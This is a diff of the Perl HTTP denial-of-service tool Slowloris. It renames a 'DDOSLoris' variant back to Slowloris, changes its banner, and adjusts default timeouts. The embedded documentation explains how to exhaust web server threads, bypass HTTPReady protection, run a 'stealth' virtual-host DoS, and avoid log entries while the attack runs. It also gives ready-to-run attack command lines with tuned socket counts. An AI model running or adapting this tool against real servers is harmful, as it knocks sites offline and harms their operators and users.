@@ -8,35 +8,34 @@ use Config;
 $SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors
 
 print <<EOTEXT;
-cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
-cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
-cccccc@@@@@cc........................................cc@@@@@cccccccccccccccccccccc
-cccccc@@@@@cc........................................cc@@@@@cccccccccccccccccccccc
-cccccc@@@@@cccccccccccccccccccccccccccccccccccccccccccc@@@@@ccccccc......ccccccccc
-cccccc@@@@@cccccccccccccccccccccccccccccccccccccccccccc@@@@@ccccccc......ccccccccc
-cccccc@@@@@cccc0000000cccccccccccccccc00000000ccccccccc@@@@@ccccccc......ccccccccc
-cccccc@@@@@c00         00ccccccccccc00        00cccccccc@@@@@cccccc......ccccccccc
-cccccc@@@@@cccc0000000cccccccccccccccc00000000ccccccccc@@@@@ccccccc......ccccccccc
-cccccc@@@@@cccccccccccccccccccccccccccccccccccccccccccc@@@@@cccccccccccccccccccccc
-cccccc@@@@@cccccccccccccccc   ccccccccccccccccccccccccc@@@@@cccccccccccccccccccccc
-cccccc@@@@@cccccccccccccccc   ccccccccccccccccccccccccc@@@@@cccccccccccccccccccccc
-cccccc@@@@@cccccccccccccccc   ccccccccccccccccccccccccc@@@@@cccccccccccccccccccccc
-ccccccc@@@@cccccccccccccccc   ccccccccccccccccccccccccc@@@@ccccccccccccccccccccccc
-cccccccc@@@cccccccccccccccc   cccccccccccccccccccccccc@@@ccccccccccccccccccccccccc
-.........@@ccccccccccccccccccccccccccccccccccccccccccc@@..........................
-...........@ccccc    ccccccccccccccccc     cccccccccc@............................
-............@ccccccc    ccccccccc     cccccccccccccc@.............................
-.............@ccccccccccc        cccccccccccccccccc@..............................
-..............@ccccccccccccccccccccccccccccccccccc@...............................
-cccccccccccccccc@ccccccccccccccccccccccccccccccc@.................................
-cc  cccccccccccccc@cccccccc@@@@@cccccccccccccc@ccccc  ccccccc  ccccccccccccccccccc
-cc  cccccccccccccccc@ccccccccccccccccccccccc@ccccccc  ccccc  ccccccccccccccccccccc
-cc  cccccccccccccccccc@ccccccccccccccccccc@ccccccccc  cc  cccccccccccccccccccccccc
-cc           ccccccccccccc@@@@@@@@@@@@@ccccccccccccc  ccccc  ccccccccccccccccccccc
-cccccccccccccccccccccccccccccccccccccccccccccccccccc  ccccccc  ccccccccccccccccccc
-cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
-cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
- Welcome to DDOSLoris - the low bandwidth, yet greedy and poisonous HTTP client
+CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@888OOCooocccc::::
+CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCCoococc:::
+CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOCoc::
+CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc::::
+CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
+ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoccc
+ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
+oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
+oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
+oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
+CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
+CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
+OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
+OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
+COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
+CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
+coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
+:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
+.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
+....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
+.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
+...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
+.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
+ ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
+   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
+  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
+       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
+ Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client
 EOTEXT
 
 my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
@@ -72,8 +71,8 @@ unless ($port) {
 }
 
 unless ($tcpto) {
-    $tcpto = 0.1;
-    print "Defaulting to a 0.1 second tcp connection timeout.\n";
+    $tcpto = 20;
+    print "Defaulting to a 20 second tcp connection timeout.\n";
 }
 
 unless ($test) {
@@ -96,7 +95,7 @@ if ( $Config{usethreads} ) {
 }
 else {
     print "No multithreading capabilites found!\n";
-    print "DDOSLoris will be slower than normal as a result.\n";
+    print "Slowloris will be slower than normal as a result.\n";
 }
 
 my $packetcount : shared     = 0;
@@ -119,7 +118,7 @@ else {
 }
 
 if ($test) {
-    my @times = ( "5", "60", "100", "540", "100000" );
+    my @times = ( "5", "60", "100", "540", "10000" );
     my $totaltime = 0;
     foreach (@times) {
         $totaltime = $totaltime + $_;
@@ -201,7 +200,7 @@ if ($test) {
     }
 
     if ( print $sock "Connection: Close\r\n\r\n" ) {
-        print "Okay that's enough time. DDOSLoris closed the socket.\n";
+        print "Okay that's enough time. Slowloris closed the socket.\n";
         print "Use $delay seconds for -timeout.\n";
         exit;
     }
@@ -214,7 +213,7 @@ if ($test) {
         print <<EOSUCKS2BU;
 Since the timeout ended up being so small ($delay seconds) and it generally 
 takes between 200-500 threads for most servers and assuming any latency at 
-all...  you might have trouble using DDOSLoris against this target.  You can 
+all...  you might have trouble using Slowloris against this target.  You can 
 tweak the -timeout flag down to less than 10 seconds but it still may not 
 build the sockets in time.
 EOSUCKS2BU
@@ -340,7 +339,7 @@ sub doconnections {
             }
         }
         print
-"Current stats:\tDDOSLoris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
+"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
         sleep($timeout);
     }
 }
@@ -365,7 +364,7 @@ __END__
 
 =head1 TITLE
 
-ddosloris
+Slowloris
 
 =head1 VERSION
 
@@ -381,7 +380,7 @@ RSnake <h@ckers.org> with threading from John Kinsella
 
 =head1 ABSTRACT
 
-ddosloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
+Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
 
 =head1 AFFECTS
 
@@ -393,35 +392,35 @@ IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
 
 =head1 DESCRIPTION
 
-DDOSLoris is designed so that a single machine (probably a Linux/UNIX machine since Windows appears to limit how many sockets you can have open at any given time) can easily tie up a typical web server or proxy server by locking up all of it's threads as they patiently wait for more data.  Some servers may have a smaller tolerance for timeouts than others, but ddosloris can compensate for that by customizing the timeouts.  There is an added function to help you get started with finding the right sized timeouts as well.
+Slowloris is designed so that a single machine (probably a Linux/UNIX machine since Windows appears to limit how many sockets you can have open at any given time) can easily tie up a typical web server or proxy server by locking up all of it's threads as they patiently wait for more data.  Some servers may have a smaller tolerance for timeouts than others, but Slowloris can compensate for that by customizing the timeouts.  There is an added function to help you get started with finding the right sized timeouts as well.
 
-As a side note, DDOSLoris does not consume a lot of resources so modern operating systems don't have a need to start shutting down sockets when they come under attack, which actually in turn makes ddosloris better than a typical flooder in certain circumstances.  Think of ddosloris as the HTTP equivalent of a SYN flood.
+As a side note, Slowloris does not consume a lot of resources so modern operating systems don't have a need to start shutting down sockets when they come under attack, which actually in turn makes Slowloris better than a typical flooder in certain circumstances.  Think of Slowloris as the HTTP equivalent of a SYN flood.
 
 =head2 Testing
 
-If the timeouts are completely unknown, DDOSLoris comes with a mode to help you get started in your testing:
+If the timeouts are completely unknown, Slowloris comes with a mode to help you get started in your testing:
 
 =head3 Testing Example:
 
-./ddosloris.pl -dns www.example.com -port 80 -test
+./slowloris.pl -dns www.example.com -port 80 -test
 
 This won't give you a perfect number, but it should give you a pretty good guess as to where to shoot for.  If you really must know the exact number, you may want to mess with the @times array (although I wouldn't suggest that unless you know what you're doing).
 
 =head2 HTTP DoS
 
-Once you find a timeout window, you can tune DDOSLoris to use certain timeout windows.  For instance, if you know that the server has a timeout of 3000 seconds, but the the connection is fairly latent you may want to make the timeout window 2000 seconds and increase the TCP timeout to 5 seconds.  The following example uses 500 sockets.  Most average Apache servers, for instance, tend to fall down between 400-600 sockets with a default configuration.  Some are less than 300.  The smaller the timeout the faster you will consume all the available resources as other sockets that are in use become available - this would be solved by threading, but that's for a future revision.  The closer you can get to the exact number of sockets, the better, because that will reduce the amount of tries (and associated bandwidth) that ddosloris will make to be successful.  ddosloris has no way to identify if it's successful or not though.
+Once you find a timeout window, you can tune Slowloris to use certain timeout windows.  For instance, if you know that the server has a timeout of 3000 seconds, but the the connection is fairly latent you may want to make the timeout window 2000 seconds and increase the TCP timeout to 5 seconds.  The following example uses 500 sockets.  Most average Apache servers, for instance, tend to fall down between 400-600 sockets with a default configuration.  Some are less than 300.  The smaller the timeout the faster you will consume all the available resources as other sockets that are in use become available - this would be solved by threading, but that's for a future revision.  The closer you can get to the exact number of sockets, the better, because that will reduce the amount of tries (and associated bandwidth) that Slowloris will make to be successful.  Slowloris has no way to identify if it's successful or not though.
 
 =head3 HTTP DoS Example:
 
-./ddosloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5
+./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5
 
 =head2 HTTPReady Bypass
 
-HTTPReady only follows certain rules so with a switch ddosloris can bypass HTTPReady by sending the attack as a POST verses a GET or HEAD request with the -httpready switch. 
+HTTPReady only follows certain rules so with a switch Slowloris can bypass HTTPReady by sending the attack as a POST verses a GET or HEAD request with the -httpready switch. 
 
 =head3 HTTPReady Bypass Example
 
-./ddosloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready
+./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready
 
 =head2 Stealth Host DoS
 
@@ -429,36 +428,36 @@ If you know the server has multiple webservers running on it in virtual hosts, y
 
 =head3 Stealth Host DoS Example:
 
-./ddosloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com
+./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com
 
 =head2 HTTPS DoS
 
-ddosloris does support SSL/TLS on an experimental basis with the -https switch.  The usefulness of this particular option has not been thoroughly tested, and in fact has not proved to be particularly effective in the very few tests I performed during the early phases of development.  Your mileage may vary.
+Slowloris does support SSL/TLS on an experimental basis with the -https switch.  The usefulness of this particular option has not been thoroughly tested, and in fact has not proved to be particularly effective in the very few tests I performed during the early phases of development.  Your mileage may vary.
 
 =head3 HTTPS DoS Example:
 
-./ddosloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https
+./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https
 
 =head2 HTTP Cache
 
-ddosloris does support cache avoidance on an experimental basis with the -cache switch.  Some caching servers may look at the request path part of the header, but by sending different requests each time you can abuse more resources.  The usefulness of this particular option has not been thoroughly tested.  Your mileage may vary.
+Slowloris does support cache avoidance on an experimental basis with the -cache switch.  Some caching servers may look at the request path part of the header, but by sending different requests each time you can abuse more resources.  The usefulness of this particular option has not been thoroughly tested.  Your mileage may vary.
 
 =head3 HTTP Cache Example:
 
-./ddosloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache
+./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache
 
 =head1 Issues
 
-ddosloris is known to not work on several servers found in the NOT AFFECTED section above and through Netscalar devices, in it's current incarnation.  They may be ways around this, but not in this version at this time.  Most likely most anti-DDoS and load balancers won't be thwarted by ddosloris, unless ddosloris is extremely distrubted, although only Netscalar has been tested. 
+Slowloris is known to not work on several servers found in the NOT AFFECTED section above and through Netscalar devices, in it's current incarnation.  They may be ways around this, but not in this version at this time.  Most likely most anti-DDoS and load balancers won't be thwarted by Slowloris, unless Slowloris is extremely distrubted, although only Netscalar has been tested. 
 
-ddosloris isn't completely quiet either, because it can't be.  Firstly, it does send out quite a few packets (although far far less than a typical GET request flooder).  So it's not invisible if the traffic to the site is typically fairly low.  On higher traffic sites it will unlikely that it is noticed in the log files - although you may have trouble taking down a larger site with just one machine, depending on their architecture.
+Slowloris isn't completely quiet either, because it can't be.  Firstly, it does send out quite a few packets (although far far less than a typical GET request flooder).  So it's not invisible if the traffic to the site is typically fairly low.  On higher traffic sites it will unlikely that it is noticed in the log files - although you may have trouble taking down a larger site with just one machine, depending on their architecture.
 
-For some reason ddosloris works way better if run from a *Nix box than from Windows.  I would guess that it's probably to do with the fact that Windows limits the amount of open sockets you can have at once to a fairly small number.  If you find that you can't open any more ports than ~130 or so on any server you test - you're probably running into this "feature" of modern operating systems.  Either way, this program seems to work best if run from FreeBSD.  
+For some reason Slowloris works way better if run from a *Nix box than from Windows.  I would guess that it's probably to do with the fact that Windows limits the amount of open sockets you can have at once to a fairly small number.  If you find that you can't open any more ports than ~130 or so on any server you test - you're probably running into this "feature" of modern operating systems.  Either way, this program seems to work best if run from FreeBSD.  
 
 Once you stop the DoS all the sockets will naturally close with a flurry of RST and FIN packets, at which time the web server or proxy server will write to it's logs with a lot of 400 (Bad Request) errors.  So while the sockets remain open, you won't be in the logs, but once the sockets close you'll have quite a few entries all lined up next to one another.  You will probably be easy to find if anyone is looking at their logs at that point - although the DoS will be over by that point too.
 
-=head1 What is a ddos loris?
+=head1 What is a slow loris?
 
-What exactly is a ddos loris?  It's an extremely cute but endangered mammal that happens to also be poisonous.  Check this out:
+What exactly is a slow loris?  It's an extremely cute but endangered mammal that happens to also be poisonous.  Check this out:
 
 http://www.youtube.com/watch?v=rLdQ3UhLoD4
